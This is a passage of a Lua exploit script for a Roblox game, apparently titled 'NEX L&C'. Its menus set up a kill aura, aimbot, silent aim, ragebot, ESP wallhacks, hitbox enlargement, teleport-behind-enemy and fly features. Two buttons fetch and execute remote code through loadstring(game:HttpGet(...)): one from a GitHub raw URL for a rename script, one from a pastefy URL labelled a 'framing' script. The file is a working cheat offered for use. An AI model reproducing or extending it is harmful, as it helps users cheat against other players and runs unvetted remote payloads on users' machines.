AuthorSection:Button({ Title = "loc:BTN_COPY_CO_AUTHOR", Callback = function()
    copyToClipboard(Translations[WindUI.CurrentLanguage or "zh-cn"].CO_AUTHOR_UID)
end })
AuthorSection:Button({ Title = "loc:BTN_COPY_HELPER2", Callback = function()
    copyToClipboard(Translations[WindUI.CurrentLanguage or "zh-cn"].HELPER2_UID)
end })
AuthorSection:Button({ Title = "loc:BTN_COPY_GROUP", Callback = function()
    copyToClipboard(Translations[WindUI.CurrentLanguage or "zh-cn"].GROUP_ID)
end })

function createFeedbackDialog(title, placeholder, webhookUrl, cooldownVar)
    local now = os.clock()
    if cooldownVar == "bug" and now - lastBugFeedback < 600 then
        local remain = math.floor(600 - (now - lastBugFeedback))
        WindUI:Notify({ Title = "loc:FEEDBACK_COOLDOWN_TITLE", Content = string.format(Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_COOLDOWN_CONTENT, remain), Duration = 3 })
        return
    elseif cooldownVar == "service" and now - lastServiceFeedback < 600 then
        local remain = math.floor(600 - (now - lastServiceFeedback))
        WindUI:Notify({ Title = "loc:FEEDBACK_COOLDOWN_TITLE", Content = string.format(Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_COOLDOWN_CONTENT, remain), Duration = 3 })
        return
    end
    local gui = Instance.new("ScreenGui")
    gui.Name = "FeedbackDialog"
    gui.Parent = CoreGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 180)
    frame.Position = UDim2.new(0.5, -175, 0.5, -90)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    frame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 8)
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, -20, 0, 30)
    label.Position = UDim2.new(0, 10, 0, 10)
    label.Text = title
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Left
    local textBox = Instance.new("TextBox", frame)
    textBox.Size = UDim2.new(1, -20, 0, 70)
    textBox.Position = UDim2.new(0, 10, 0, 45)
    textBox.BackgroundColor3 = Color3.fromRGB(50,50,60)
    textBox.TextColor3 = Color3.fromRGB(255,255,255)
    textBox.Text = ""
    textBox.PlaceholderText = placeholder
    textBox.ClearTextOnFocus = false
    textBox.MultiLine = true
    local submit = Instance.new("TextButton", frame)
    submit.Size = UDim2.new(0, 80, 0, 30)
    submit.Position = UDim2.new(0.5, -90, 1, -40)
    submit.Text = "Send"
    submit.BackgroundColor3 = Color3.fromRGB(80,80,90)
    submit.TextColor3 = Color3.fromRGB(255,255,255)
    submit.BorderSizePixel = 0
    local cancel = Instance.new("TextButton", frame)
    cancel.Size = UDim2.new(0, 80, 0, 30)
    cancel.Position = UDim2.new(0.5, 10, 1, -40)
    cancel.Text = "Cancel"
    cancel.BackgroundColor3 = Color3.fromRGB(80,80,90)
    cancel.TextColor3 = Color3.fromRGB(255,255,255)
    cancel.BorderSizePixel = 0
    submit.MouseButton1Click:Connect(function()
        local content = textBox.Text
        if content == "" then
            WindUI:Notify({ Title = "Error", Content = "Content cannot be empty", Duration = 2 })
            return
        end
        local msg = { content = string.format("**%s**: %s", localPlayer.Name, content), username = "NEX L&C Feedback" }
        sendHttpRequest(webhookUrl, msg)
        if cooldownVar == "bug" then lastBugFeedback = os.clock()
        else lastServiceFeedback = os.clock() end
        WindUI:Notify({ Title = "loc:FEEDBACK_SUCCESS_TITLE", Content = "loc:FEEDBACK_SUCCESS_CONTENT", Duration = 3 })
        gui:Destroy()
    end)
    cancel.MouseButton1Click:Connect(function() gui:Destroy() end)
    frame.Parent = gui
end

AnnounceSection:Button({ Title = "loc:BTN_BUG_FEEDBACK", Callback = function()
    local title = Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_INPUT_TITLE
    local placeholder = Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_PLACEHOLDER
    createFeedbackDialog(title, placeholder, bugWebhookUrl, "bug")
end })
AnnounceSection:Button({ Title = "loc:BTN_SERVICE_FEEDBACK", Callback = function()
    local title = Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_INPUT_TITLE
    local placeholder = Translations[WindUI.CurrentLanguage or "zh-cn"].FEEDBACK_PLACEHOLDER
    createFeedbackDialog(title, placeholder, serviceWebhookUrl, "service")
end })

CombatTab = Window:Tab({ Title = "loc:TAB_COMBAT", Icon = "swords" })

AuxSection = CombatTab:Section({ Title = "辅助功能", Icon = "shield", Opened = true })
AuxSection:Toggle({ Title = "大头Hitbox", Desc = "增大敌人头部受击盒", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.bigHeadEnabled = s
    updateBigHead()
end })
_G.NEX_LC_VARS.desyncMainToggle = AuxSection:Toggle({
    Title = "幽灵模式面板",
    Desc = "开启后显示幽灵模式控制面板，在面板内可进入隐身",
    Value = false,
    Callback = function(state)
        if state then
            createGhostExtraUI()
        else
            if ghostMode then toggleGhostMode(false) end
            destroyGhostExtraUI()
        end
    end
})
AuxSection:Divider()

_G.NEX_LC_VARS.autoChargeWindUIToggle = AuxSection:Toggle({ 
    Title = "无限冲锋", 
    Desc = "开启后显示额外控制UI，需在UI中开启冲锋", 
    Value = false, 
    Callback = function(state)
        if state then
            if not _G.NEX_LC_VARS.autoChargeGui then
                createAutoChargeUI()
            else
                _G.NEX_LC_VARS.autoChargeGui.Frame.Visible = true
            end
            if _G.NEX_LC_VARS.autoChargeGui and _G.NEX_LC_VARS.autoChargeGui.ToggleButton then
                local btn = _G.NEX_LC_VARS.autoChargeGui.ToggleButton
                btn.Text = _G.NEX_LC_VARS.autoChargeEnabled and "关闭" or "开启"
                btn.BackgroundColor3 = _G.NEX_LC_VARS.autoChargeEnabled and Color3.fromRGB(20, 60, 20) or Color3.fromRGB(60, 20, 20)
            end
        else
            if _G.NEX_LC_VARS.autoChargeGui then
                _G.NEX_LC_VARS.autoChargeGui.Frame.Visible = false
            end
            if _G.NEX_LC_VARS.autoChargeEnabled then
                _G.NEX_LC_VARS.autoChargeEnabled = false
                updateAutoCharge()
            end
        end
    end
})

AuxSection:Toggle({
    Title = "遁地",
    Desc = "开启后显示遁地独立UI，包含开启/关闭按钮",
    Value = false,
    Callback = function(state)
        _G.NEX_LC_VARS.undergroundEnabled = state
        if state then
            enableUndergroundFeature()
        else
            disableUndergroundFeature()
        end
    end
})

AuxSection:Toggle({
    Title = "传送到敌人身后",
    Desc = "开启后显示独立UI，包含'传送身后'（瞬间）和'持续传送'开关",
    Value = false,
    Callback = function(state)
        _G.NEX_LC_VARS.teleportBehindEnabled = state
        if state then
            createTeleportBehindUI()
        else
            destroyTeleportBehindUI()
        end
    end
})

CombatCoreSection = CombatTab:Section({ Title = "自动攻击", Icon = "swords", Opened = true })
CombatCoreSection:Toggle({ Title = "loc:TOGGLE_MANUAL_HIT", Desc = "loc:DESC_MANUAL_HIT", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.manualHitEnabled = v
    updateManualHit()
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_HIT_COUNT", Step = 1, Value = { Min = 1, Max = 3, Default = 3 }, Callback = function(v)
    _G.NEX_LC_VARS.hitCount = v
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_HIT_DELAY", Step = 0.01, Value = { Min = 0.03, Max = 0.2, Default = 0.08 }, Callback = function(v)
    _G.NEX_LC_VARS.hitDelay = v
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_MANUAL_RANGE", Step = 1, Value = { Min = 3, Max = 80, Default = 45 }, Callback = function(v)
    _G.NEX_LC_VARS.manualRange = v
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_MANUAL_FOV", Step = 1, Value = { Min = 0, Max = 360, Default = 180 }, Callback = function(v)
    _G.NEX_LC_VARS.manualFOV = v
end })
CombatCoreSection:Divider()
CombatCoreSection:Toggle({ Title = "loc:TOGGLE_FAST_MELEE", Desc = "loc:DESC_FAST_MELEE", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.fastMeleeEnabled = s
    updateFastMelee()
end })
CombatCoreSection:Divider()
CombatCoreSection:Toggle({ Title = "loc:TOGGLE_KILL_AURA", Desc = "自动攻击最近敌人（支持空手，但需要开启下面的子开关）", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.killAuraEnabled = v
    updateKillAura()
end })
CombatCoreSection:Toggle({ Title = "空手杀戮", Desc = "开启后允许从背包取武器进行杀戮（关闭则仅使用当前手持武器）", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.killAuraAllowEmptyHand = v
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_ATTACK_RANGE", Step = 1, Value = { Min = 3, Max = 20, Default = 5 }, Callback = function(v)
    _G.NEX_LC_VARS.attackRange = v
end })
CombatCoreSection:Slider({ Title = "loc:SLIDER_ATTACK_SPEED", Step = 0.05, Value = { Min = 0.05, Max = 0.5, Default = 0.1 }, Callback = function(v)
    _G.NEX_LC_VARS.attackCD = v
end })
CombatCoreSection:Slider({ Title = "最大攻击人数", Step = 1, Value = { Min = 1, Max = 3, Default = 1 }, Callback = function(v)
    _G.NEX_LC_VARS.maxAttackCount = v
end })
CombatCoreSection:Divider()
CombatCoreSection:Toggle({ Title = "loc:TOGGLE_BREAK_BUILDINGS", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.breakBuildingsEnabled = v
    updateBreakBuildings()
end })
CombatCoreSection:Toggle({ Title = "自动格挡", Desc = "自动持续格挡并保持移速不低于16", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.autoBlockEnabled = v
    updateAutoBlock()
end })
CombatCoreSection:Divider()
CombatCoreSection:Toggle({ Title = "杀戮机器人", Desc = "自动攻击最近的人机/AI", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.killBotEnabled = v
    if v then
        updateBotCache()
        lastCacheUpdate = os.clock()
    end
    updateKillBot()
end })
CombatCoreSection:Slider({ Title = "攻击距离", Step = 1, Value = { Min = 3, Max = 20, Default = 5 }, Callback = function(v)
    _G.NEX_LC_VARS.killBotRange = v
end })
CombatCoreSection:Slider({ Title = "攻击速度", Step = 0.05, Value = { Min = 0.05, Max = 0.5, Default = 0.1 }, Callback = function(v)
    _G.NEX_LC_VARS.killBotCD = v
end })

MiscCombatSection = CombatTab:Section({ Title = "其他辅助", Icon = "shield", Opened = true })
MiscCombatSection:Toggle({ Title = "loc:TOGGLE_BRING_ALL", Desc = "loc:DESC_BRING_ALL", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.bringAllEnabled = v
    updateBringAll()
end })
MiscCombatSection:Toggle({ Title = "loc:TOGGLE_SHOW_TRACERS", Desc = "loc:DESC_SHOW_TRACERS", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.showTracers = s
    if silentHookActive then
        disableSilentHook()
        enableSilentHook()
    end
end })
MiscCombatSection:Toggle({ Title = "显示他人预瞄点", Desc = "持续显示敌人瞄准方向的3D射线（仅持有武器者）", Value = false, Callback = function(state)
    toggleRemoteEventTracker(state)
end })
MiscCombatSection:Divider()
MiscCombatSection:Toggle({ Title = "跳跃按钮", Desc = "在右下角显示跳跃按钮（无冷却限制）", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.jumpButtonEnabled = s
    updateJumpButton()
end })
MiscCombatSection:Toggle({ Title = "躲子弹", Desc = "当检测到弹道或预瞄射线击中自己时，向侧向加速位移", Value = false, Callback = function(s)
    bulletDodgeEnabled = s
    if not s then bulletDodge2Enabled = false end
    updateDodge()
end })
MiscCombatSection:Toggle({ Title = "躲子弹2.0", Desc = "空中改变重心、朝向和轴线偏移", Value = false, Callback = function(s)
    bulletDodge2Enabled = s
    if s then bulletDodgeEnabled = true end
    updateDodge()
end })

AimbotTab = Window:Tab({ Title = "loc:TAB_AIMBOT", Icon = "crosshair" })
AimbotSection = AimbotTab:Section({ Title = "自瞄设置", Icon = "target", Opened = true })

AimbotSection:Toggle({ Title = "loc:TOGGLE_AIMBOT", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.aimbotEnabled = s
    updateAimbot()
end })
AimbotSection:Toggle({ Title = "loc:TOGGLE_AIM_HEAD", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.aimHead = s
end })
AimbotSection:Slider({ Title = "loc:SLIDER_AIM_RANGE", Step = 10, Value = { Min = 100, Max = 800, Default = 300 }, Callback = function(v)
    _G.NEX_LC_VARS.aimRange = v
end })
AimbotSection:Slider({ Title = "loc:SLIDER_AIM_SMOOTHNESS", Step = 0.1, Value = { Min = 0.1, Max = 1, Default = 0.5 }, Callback = function(v)
    _G.NEX_LC_VARS.aimSmooth = v
end })
AimbotSection:Divider()
AimbotSection:Toggle({ Title = "loc:TOGGLE_SILENT_AIM", Desc = "开启静默瞄准（眉心瞄准+近战豁免+墙边扩大）", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.silentAimEnabled = s
    updateSilentAim()
end })
AimbotSection:Toggle({ Title = "静默FOV限制", Desc = "仅对屏幕中心的敌人生效", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.silentFovEnabled = s
end })
AimbotSection:Toggle({ Title = "墙体检测（静默/自瞄）", Desc = "开启后只瞄准可见敌人", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.wallCheckEnabled = s
    if silentHookActive then
        disableSilentHook()
        enableSilentHook()
    end
end })
AimbotSection:Divider()

local lockBotToggle = AimbotSection:Toggle({ Title = "锁定AI", Desc = "需同时开启自瞄和静默瞄准才生效", Value = true, Callback = function(s)
    lockBots = s
    if precisionEnabled then
        installPrecisionSilent()
    end
end })

FastReloadSection = AimbotTab:Section({ Title = "loc:SECTION_FAST_RELOAD", Icon = "zap", Opened = true })
FastReloadSection:Toggle({ Title = "loc:TOGGLE_AUTO_RELOAD", Desc = "loc:DESC_AUTO_RELOAD", Value = false, Callback = function(state)
    _G.NEX_LC_VARS.autoReloadEnabled = state
    updateAutoReload()
end })
FastReloadSection:Button({ Title = "loc:BTN_MANUAL_RELOAD", Desc = "loc:DESC_MANUAL_RELOAD", Callback = manualReload })
FastReloadSection:Toggle({ Title = "loc:TOGGLE_FAST_RELOAD2", Desc = "loc:DESC_FAST_RELOAD2", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.fastReload2Enabled = s
    updateFastReload2()
end })

RagebotSection = AimbotTab:Section({ Title = "loc:SECTION_RAGEBOT", Icon = "target", Opened = true })
ragebotToggle = RagebotSection:Toggle({ Title = "loc:TOGGLE_RAGEBOT", Value = false, Callback = function(state)
    _G.NEX_LC_VARS.ragebotEnabled = state
    updateRagebotConnection()
    if state and localPlayer.Character then
        _G.NEX_LC_VARS.lastRageShot = os.clock() - _G.NEX_LC_VARS.rageInterval
    end
end })
RagebotSection:Slider({ Title = "loc:SLIDER_RAGE_INTERVAL", Step = 0.5, Value = { Min = 1, Max = 20, Default = 6 }, Callback = function(v)
    _G.NEX_LC_VARS.rageInterval = v
end })
RagebotSection:Toggle({ Title = "loc:TOGGLE_RAGE_WALL_CHECK", Value = false, Callback = function(state)
    _G.NEX_LC_VARS.rageWallCheck = state
end })

function getRageEnemyPlayers()
    local enemies = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= localPlayer and isEnemy(plr) then
            table.insert(enemies, plr.Name)
        end
    end
    table.sort(enemies)
    return enemies
end

local function updateRageDropdowns()
    local enemyNames = getRageEnemyPlayers()
    if rageSpecificDropdown and rageSpecificDropdown.SetValues then
        rageSpecificDropdown:SetValues(enemyNames)
    end
    if rageWhitelistDropdown and rageWhitelistDropdown.SetValues then
        rageWhitelistDropdown:SetValues(enemyNames)
    end
end

rageSpecificDropdown = RagebotSection:Dropdown({ 
    Title = "loc:DROPDOWN_RAGE_SPECIFIC", 
    Values = getRageEnemyPlayers(), 
    Default = "", 
    Width = 250, 
    Callback = function(selected)
        _G.NEX_LC_VARS.rageSpecificTarget = selected or ""
    end 
})

rageWhitelistDropdown = RagebotSection:Dropdown({ 
    Title = "loc:DROPDOWN_RAGE_WHITELIST", 
    Values = getRageEnemyPlayers(), 
    Default = "", 
    Width = 250, 
    Callback = function(selected)
        _G.NEX_LC_VARS.rageWhitelist = selected or ""
    end 
})

Players.PlayerAdded:Connect(updateRageDropdowns)
Players.PlayerRemoving:Connect(updateRageDropdowns)

-- ===== ESP Tab =====
ESPTab = Window:Tab({ Title = "loc:TAB_ESP", Icon = "eye" })
ESPMainSection = ESPTab:Section({ Title = "ESP 设置", Icon = "eye", Opened = true })

espMainToggle = ESPMainSection:Toggle({ 
    Title = "启用 ESP", 
    Desc = "总开关", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Enabled = state
        if not state then
            for _, obj in pairs(espCache) do espHide(obj) end
            for _, obj in pairs(npcCache) do espHide(obj) end
            for _, hl in pairs(espHighlightCache) do
                if hl and hl.Parent then hl:Destroy() end
            end
            for _, hl in pairs(npcHighlightCache) do
                if hl and hl.Parent then hl:Destroy() end
            end
            espHighlightCache = {}
            npcHighlightCache = {}
        end
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示玩家边框", 
    Desc = "为敌人和NPC添加 Highlight 轮廓（颜色同方框）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Outline = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示方框", 
    Desc = "为敌人和NPC绘制方框（可见绿，不可见红）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Boxes = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示名字", 
    Desc = "在方框上方显示名称（NPC加🤖前缀）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Names = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示距离", 
    Desc = "在脚底下方显示与目标的距离", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Distance = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示轨迹线", 
    Desc = "从屏幕中心到脚底，墙体检测（绿可见，红隔墙）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_Tracers = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "显示瞄准线", 
    Desc = "从敌人/NPC头部向前延伸30单位（橙色）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_AimLine = state
    end 
})

ESPMainSection:Toggle({ 
    Title = "队伍检测（不显示队友）", 
    Desc = "开启后，同一队伍的玩家将不显示任何ESP元素（NPC不受影响）", 
    Value = false, 
    Callback = function(state)
        _G.NEX_LC_VARS.ESP_TeamCheck = state
    end 
})

ESPMainSection:Divider()
ESPMainSection:Paragraph({ Title = "提示", Content = "ESP 使用 Drawing API，若部分元素不显示，请确保执行器支持 Drawing。", Color = Color3.fromRGB(200, 200, 200) })
AutoTab = Window:Tab({ Title = "loc:TAB_AUTO", Icon = "target" })
AutoTab:Toggle({ Title = "loc:TOGGLE_AUTO_MARK", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.autoMarkEnabled = s
    updateAutoMark()
end })
AutoTab:Divider()
AutoTab:Toggle({ Title = "loc:TOGGLE_BURN", Desc = "loc:DESC_BURN", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.burnEnabled = v
    updateBurn()
end })
AutoTab:Slider({ Title = "loc:SLIDER_BURN_RANGE", Step = 1, Value = { Min = 10, Max = 60, Default = 30 }, Callback = function(v)
    _G.NEX_LC_VARS.burnRange = v
end })
AutoTab:Divider()
AutoTab:Toggle({ Title = "loc:TOGGLE_REPAIR_BUILDINGS", Desc = "loc:DESC_REPAIR_BUILDINGS", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.autoRepairEnabled = v
    updateAutoRepair()
end })
AutoTab:Slider({ Title = "loc:SLIDER_REPAIR_RANGE", Step = 1, Value = { Min = 5, Max = 30, Default = 15 }, Callback = function(v)
    _G.NEX_LC_VARS.repairRange = v
end })
AutoTab:Slider({ Title = "loc:SLIDER_REPAIR_SPEED", Step = 0.01, Value = { Min = 0.03, Max = 0.3, Default = 0.05 }, Callback = function(v)
    _G.NEX_LC_VARS.repairSpeed = v
end })

AutoTab:Divider()
AutoTab:Button({ Title = "加载改名脚本", Desc = "点击加载外部改名脚本", Callback = function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/q639977310-design/ui-/refs/heads/main/%E6%94%B9%E5%90%8D"))()
        WindUI:Notify({ Title = "改名脚本", Content = "已加载", Duration = 2 })
    end)
end })
AutoTab:Button({ Title = "伪装脚本", Desc = "加载NEX栽赃脚本", Callback = function()
    pcall(function()
      loadstring(game:HttpGet("https://pastefy.app/i3uwLtVO/raw"))()
    end)
end })

-- ============================================
-- 飞行控制 (集成到自动/职业)
-- ============================================
local flyCameraEnabled = false
local flyCameraSpeed = 40
local flyCameraSensitivity = 0.3
local flyCameraConn = nil
local flyCameraInputConn = nil
local flyCameraVelocity = Vector3.new(0, 0, 0)
local flyCameraPos = Vector3.new(0, 0, 0)
local flyCameraTargetRot = CFrame.new()
local flyCameraCurrentRot = CFrame.new()
local flyCameraSavedType = Enum.CameraType.Custom
local flyCameraSavedSubject = nil
local flyCameraSavedPlatformStand = false
local flyCameraMode = nil -- "pc" or "mobile"

-- 手机端变量
local flyMobileUI = nil
local flyJoystickKnob = nil
local flyJoystickActive = false
local flyJoystickVector = Vector2.new(0, 0)
local flyJoystickTouchId = nil
local flyJoystickCenter = Vector2.new(0, 0)
local flyBtnUp = false
local flyBtnDown = false
local flyBtnFast = false

-- 启动选择界面
function showFlyCameraModeSelector()
    if CoreGui:FindFirstChild("FlyCameraModeSelector") then
        CoreGui:FindFirstChild("FlyCameraModeSelector"):Destroy()
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "FlyCameraModeSelector"
    gui.ResetOnSpawn = false
    gui.Parent = CoreGui
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 99999

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.5
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 340, 0, 220)
    panel.Position = UDim2.new(0.5, -170, 0.5, -110)
    panel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    panel.BorderSizePixel = 0
    panel.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = panel

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 255)
    stroke.Thickness = 2
    stroke.Parent = panel

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "✈️ 选择飞行模式"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Font = Enum.Font.GothamBold
    title.Parent = panel

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, -20, 0, 20)
    subtitle.Position = UDim2.new(0, 10, 0, 50)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "请选择适合您设备的控制方式"
    subtitle.TextColor3 = Color3.fromRGB(150, 150, 170)
    subtitle.TextSize = 12
    subtitle.Font = Enum.Font.Gotham
    subtitle.Parent = panel

    local pcBtn = Instance.new("TextButton")
    pcBtn.Size = UDim2.new(0, 140, 0, 90)
    pcBtn.Position = UDim2.new(0, 20, 0, 85)
    pcBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    pcBtn.Text = "🖥️ PC端\nWASD + 鼠标"
    pcBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    pcBtn.TextSize = 14
    pcBtn.Font = Enum.Font.GothamBold
    pcBtn.Parent = panel

    local pcCorner = Instance.new("UICorner")
    pcCorner.CornerRadius = UDim.new(0, 8)
    pcCorner.Parent = pcBtn

    local mobileBtn = Instance.new("TextButton")
    mobileBtn.Size = UDim2.new(0, 140, 0, 90)
    mobileBtn.Position = UDim2.new(1, -160, 0, 85)
    mobileBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    mobileBtn.Text = "📱 手机端\n摇杆 + GUI"
    mobileBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    mobileBtn.TextSize = 14
    mobileBtn.Font = Enum.Font.GothamBold
    mobileBtn.Parent = panel

    local mobileCorner = Instance.new("UICorner")
    mobileCorner.CornerRadius = UDim.new(0, 8)
    mobileCorner.Parent = mobileBtn

    local function onSelect(mode, btn)
        btn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
        btn.Text = "启动中..."
        task.wait(0.2)
        flyCameraMode = mode
        gui:Destroy()
        local ok, err = pcall(startFlyCameraCore)
        if not ok then
            warn("[NEX L&C] 飞行模式启动失败: " .. tostring(err))
            WindUI:Notify({ Title = "飞行模式", Content = "启动失败: " .. tostring(err), Duration = 3 })
            flyCameraEnabled = false
            flyCameraMode = nil
        end
    end

    pcBtn.MouseButton1Click:Connect(function()
        onSelect("pc", pcBtn)
    end)

    mobileBtn.MouseButton1Click:Connect(function()
        onSelect("mobile", mobileBtn)
    end)
end

function showFlyMobileControls()
    if flyMobileUI then flyMobileUI:Destroy() end

    flyMobileUI = Instance.new("ScreenGui")
    flyMobileUI.Name = "FlyCameraMobileControls"
    flyMobileUI.ResetOnSpawn = false
    flyMobileUI.Parent = localPlayer:WaitForChild("PlayerGui")
    flyMobileUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    flyMobileUI.DisplayOrder = 99999

    -- 摇杆
    local joy = Instance.new("Frame")
    joy.Name = "Joystick"
    joy.Size = UDim2.new(0, 100, 0, 100)
    joy.Position = UDim2.new(0, 25, 1, -130)
    joy.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    joy.BackgroundTransparency = 0.5
    joy.BorderSizePixel = 0
    joy.Parent = flyMobileUI

    local jc = Instance.new("UICorner")
    jc.CornerRadius = UDim.new(1, 0)
    jc.Parent = joy

    local js = Instance.new("UIStroke")
    js.Color = Color3.fromRGB(80, 80, 100)
    js.Thickness = 2
    js.Transparency = 0.3
    js.Parent = joy

    flyJoystickKnob = Instance.new("Frame")
    flyJoystickKnob.Name = "Knob"
    flyJoystickKnob.Size = UDim2.new(0, 36, 0, 36)
    flyJoystickKnob.Position = UDim2.new(0.5, -18, 0.5, -18)
    flyJoystickKnob.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    flyJoystickKnob.BackgroundTransparency = 0.2
    flyJoystickKnob.BorderSizePixel = 0
    flyJoystickKnob.Parent = joy

    local kc = Instance.new("UICorner")
    kc.CornerRadius = UDim.new(1, 0)
    kc.Parent = flyJoystickKnob

    -- 上升按钮
    local upBtn = Instance.new("TextButton")
    upBtn.Size = UDim2.new(0, 50, 0, 50)
    upBtn.Position = UDim2.new(1, -70, 0.5, -60)
    upBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    upBtn.BackgroundTransparency = 0.3
    upBtn.Text = "⬆"
    upBtn.TextSize = 20
    upBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    upBtn.Font = Enum.Font.GothamBold
    upBtn.Parent = flyMobileUI

    local uc = Instance.new("UICorner")
    uc.CornerRadius = UDim.new(1, 0)
    uc.Parent = upBtn

    -- 下降按钮
    local downBtn = Instance.new("TextButton")
    downBtn.Size = UDim2.new(0, 50, 0, 50)
    downBtn.Position = UDim2.new(1, -70, 0.5, 10)
    downBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 50)
    downBtn.BackgroundTransparency = 0.3
    downBtn.Text = "⬇"
    downBtn.TextSize = 20
    downBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    downBtn.Font = Enum.Font.GothamBold
    downBtn.Parent = flyMobileUI

    local dc = Instance.new("UICorner")
    dc.CornerRadius = UDim.new(1, 0)
    dc.Parent = downBtn

    -- 加速按钮
    local fastBtn = Instance.new("TextButton")
    fastBtn.Size = UDim2.new(0, 50, 0, 50)
    fastBtn.Position = UDim2.new(1, -130, 1, -70)
    fastBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
    fastBtn.BackgroundTransparency = 0.3
    fastBtn.Text = "⚡"
    fastBtn.TextSize = 22
    fastBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    fastBtn.Font = Enum.Font.GothamBold
    fastBtn.Parent = flyMobileUI

    local fc = Instance.new("UICorner")
    fc.CornerRadius = UDim.new(1, 0)
    fc.Parent = fastBtn

    -- 按钮事件
    upBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnUp = true
            upBtn.BackgroundTransparency = 0.1
        end
    end)
    upBtn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnUp = false
            upBtn.BackgroundTransparency = 0.3
        end
    end)

    downBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnDown = true
            downBtn.BackgroundTransparency = 0.1
        end
    end)
    downBtn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnDown = false
            downBtn.BackgroundTransparency = 0.3
        end
    end)

    fastBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnFast = true
            fastBtn.BackgroundTransparency = 0.1
        end
    end)
    fastBtn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyBtnFast = false
            fastBtn.BackgroundTransparency = 0.3
        end
    end)
end

